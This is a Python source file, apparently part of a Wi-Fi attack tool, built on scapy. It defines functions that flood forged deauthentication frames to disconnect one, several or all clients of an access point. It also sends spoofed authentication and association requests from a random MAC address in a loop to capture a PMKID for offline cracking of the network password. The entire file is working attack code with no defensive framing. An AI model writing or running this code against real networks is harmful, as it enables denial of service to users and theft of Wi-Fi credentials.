import asyncio

from scapy.layers.dot11 import (
    Dot11,
    Dot11AssoReq,
    Dot11Auth,
    Dot11Deauth,
    Dot11Elt,
    RadioTap,
    sendp,
)

from utils.network import generate_random_mac


class PacketsBuilder():
    def __init__(self, bssid : str, device : str, ssid: str):
        self.bssid = bssid
        self.device = device
        self.random_mac = generate_random_mac()
        self.ssid = ssid 

    async def kill_one_user(self, client_mac : str) -> bool:
        packet = (
            RadioTap() / 
            Dot11(addr1=client_mac, addr2=self.bssid, addr3=self.bssid) / 
            Dot11Deauth(reason=7)
        )
        await asyncio.to_thread(sendp, packet, iface=self.device, count=50, inter=0.1, verbose=False)
        return True
    
    async def kill_many_users(self, clients_mac : list) -> bool:
        for client_mac in clients_mac:
            await self.kill_one_user(client_mac)
        return True

    async def kill_all_users(self) -> bool:
        return await self.kill_one_user('ff:ff:ff:ff:ff:ff')

    async def auth_request(self):
        packet = (
            RadioTap() /
            Dot11(addr1=self.bssid, addr2=self.random_mac, addr3=self.bssid) / 
            Dot11Auth(algo=0, seqnum=1, status=0)
        )
        await asyncio.to_thread(sendp, packet, iface=self.device, count=1, verbose=False)

    async def asso_request(self):
        rsn_ie_bytes = (
            b"\x01\x00"          # RSN Version (always 1)
            b"\x00\x0f\xac\x02"  # Group Cipher Suite: AES (CCMP)
            b"\x02\x00"          # Pairwise Cipher Suite Count (2 cipher)
            b"\x00\x0f\xac\x04"  # Cipher 1: AES (CCMP)
            b"\x00\x0f\xac\x02"  # Cipher 2: TKIP (для совместимости)
            b"\x01\x00"          # AKM Suite Count (1 check method)
            b"\x00\x0f\xac\x02"  # AKM Suite 1: PSK (common passwork / Pre-Shared Key)
            b"\x0c\x00"          # RSN Capabilities (CRITICAL: bit of support Pre-auth)
        )
        packet = (
            RadioTap() /
                Dot11(addr1=self.bssid, addr2=self.random_mac, addr3=self.bssid) /
                Dot11AssoReq(cap=0x1104, listen_interval=10) /
                Dot11Elt(ID=0, info=self.ssid.encode()) /
                Dot11Elt(ID=48, info=rsn_ie_bytes)
        )
        await asyncio.to_thread(sendp, packet, iface=self.device, count=1, verbose=False)

    async def pmkid_loop(self):
        for _ in range(0, 6):
            await self.auth_request()
            await asyncio.sleep(0.1)

            await self.asso_request()
            await asyncio.sleep(4)

        print("pmkid loop was ended")
